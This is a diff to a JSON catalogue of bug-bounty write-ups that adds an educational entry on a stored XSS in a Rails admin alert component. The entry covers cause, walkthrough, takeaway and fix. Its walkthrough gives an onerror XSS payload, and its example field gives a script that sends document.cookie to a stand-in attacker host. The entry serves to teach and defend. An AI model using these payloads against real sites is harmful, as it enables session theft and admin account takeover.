@@ -1,5 +1,45 @@
 [
   {
+    "id": "d7e084365bc2",
+    "title": "Stored XSS in an Admin Alert Component via an Admin-Editable Store Name",
+    "url": "https://medium.com/@zyadatef2462003/stored-xss-in-an-admin-alert-component-via-an-admin-editable-store-name-2bbc910e2fe4",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Zyadatef"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-15T22:47:43.000Z",
+    "added_at": "2026-10-15T23:04:28.604Z",
+    "categories": [
+      "xss"
+    ],
+    "severity": "medium",
+    "difficulty": "beginner",
+    "summary_en": "An admin-editable store name is rendered without HTML escaping in a bulk-deletion error alert, allowing a lower-privileged admin to execute JavaScript in a higher-privileged admin's session.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The vulnerability stems from a breakdown in the Ruby on Rails security model across three layers. First, the 'Alert' component explicitly uses the '.html_safe' method, which instructs the browser to render the message as raw code rather than safe text. Second, the application uses a plain internationalization (I18n) key for the error description, which fails to perform 'HTML escaping' (turning characters like '<' into safe text) on the interpolated store name. Finally, the controller joins multiple error messages using a raw '<br/>' string, which prevents Rails from automatically identifying and neutralizing the malicious payload before it reaches the browser.",
+      "walkthrough": "RECON\nStep 1: Log into the admin panel of the e-commerce platform.\nStep 2: Identify the 'Store Settings' section where the 'Store Name' can be edited.\nStep 3: Note that this name is a 'parameter' (a piece of data sent to the server) that appears in various parts of the 'UI' (User Interface).\nDISCOVERY\nStep 4: Observe that when a bulk action (like deleting multiple stores) fails, the system generates a 'flash message' (a temporary notification).\nStep 5: Notice that the error message includes the names of the stores that could not be deleted.\nEXPLOITATION\nStep 6: Change the 'Store Name' to a malicious 'payload' (code designed to exploit a bug).\n<img src=x onerror=alert(document.cookie)>\nStep 7: Why: This is an 'XSS' (Cross-Site Scripting) payload. It uses an 'HTML' (webpage structure language) image tag with a broken source ('x') to trigger an 'onerror' event, which runs 'JavaScript' (a language that makes pages interactive).\nStep 8: Navigate to the 'Bulk Store Actions' menu.\nStep 9: Select the 'poisoned' store and another store that is protected from deletion (e.g., the default store).\nStep 10: Click the 'Delete' button to trigger the 'endpoint' (a specific web address that handles tasks).\nStep 11: The server processes the 'HTTP request' (a message from your browser to the server) and fails to delete the stores.\nStep 12: The server executes the following code to build the error message:\nfailure_summary = failed.map { |record| t(\".error.description\", name: record.name) }.join(\"<br/>\")\nStep 13: Why: The 't()' function uses a plain key, so it performs 'interpolation' (inserting the name into the text) without cleaning the malicious characters.\nStep 14: The server sends the response back to the browser.\nStep 15: The browser loads the 'Alert' component which contains this code:\n<p class=\"font-normal text-sm text-black leading-none\"><%= @message.html_safe %></p>\nStep 16: Why: The '.html_safe' method tells the browser's 'DOM' (the internal map of the page) to treat the message as live code instead of plain text.\nIMPACT\nStep 17: The browser attempts to load the image tag from the store name.\nStep 18: The load fails, and the 'onerror' script executes: 'alert(document.cookie)'.\nStep 19: Why: 'document.cookie' is a browser property containing 'cookies' (files used to keep you logged in), which are now exposed to the script.",
+      "example": "Assume a fictional site 'target.example' has a 'Department Management' tool. An admin changes a department name to '<script>fetch(\"https://attacker.com/steal?c=\" + document.cookie)</script>'. When a Super-Admin views a 'System Audit Log' that lists this department name, the site uses a vulnerable rendering method: 'render_log(entry.name.raw)'. Because the 'raw' method is used, the browser executes the script, sending the Super-Admin's login cookies to the attacker's server. This works because the application assumes data entered by any admin is 'trusted' and does not need to be cleaned before being shown to other admins.",
+      "takeaway": "When hunting for bugs, never assume that 'Admin' areas are safe; developers often disable security features like 'HTML escaping' in internal tools to save time. Look for fields that are 'interpolated' (inserted) into system notifications, logs, or error messages. A key signal in Ruby on Rails applications is the use of '.html_safe', 'raw()', or I18n keys that do not end in '_html'. A common mistake is testing only the primary user profile; always test how your input appears when viewed by different user roles or in 'bulk action' summaries. A variant of this bug is 'Stored XSS' in log viewers, where a user's 'User-Agent' string is rendered without escaping for an admin.",
+      "fix": "The best fix is to remove the '.html_safe' call from the alert component and let Rails handle escaping automatically. If HTML (like line breaks) is required in the message, use 'safe_join' to combine the strings safely. Additionally, update the I18n translation key to end in '_html' (e.g., 'description_html'), which tells Rails to automatically escape any variables like '%{name}' inserted into the translation.\n\n# Fixed Controller Code\nfailure_summary = failed.map { |record| \n  t(\".error.description_html\", name: record.name) \n}\n@message = safe_join(failure_summary, tag.br)",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "> **TL;DR:** In the admin panel of a Ruby on Rails e-commerce platform, the alert component renders its message with `.html_safe` — i.e. without HTML escaping. The one code path that feeds it (the bulk store-destroy failure flash) builds that message from the **store name**, an admin-editable field, interpolated through a non-`_html` I18n key (which does not escape) and joined with a raw `\"<br/>\"`. So a store whose name contains an HTML/JS payload executes in the admin's browser when a bulk store-destroy partially fails. Confirmed on a live install: `<img src=x onerror=...>` was rendered verba",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 47
+  },
+  {
     "id": "78ea383cee0c",
     "title": "Reflected XSS di Aplikasi Pelaporan Kecamatan Pemerintah Kabupaten [REDACTED] via Parameter id",
     "url": "https://icikiwirsol.medium.com/reflected-xss-di-aplikasi-pelaporan-kecamatan-pemerintah-kabupaten-redacted-via-parameter-id-1a19d6e1474c",
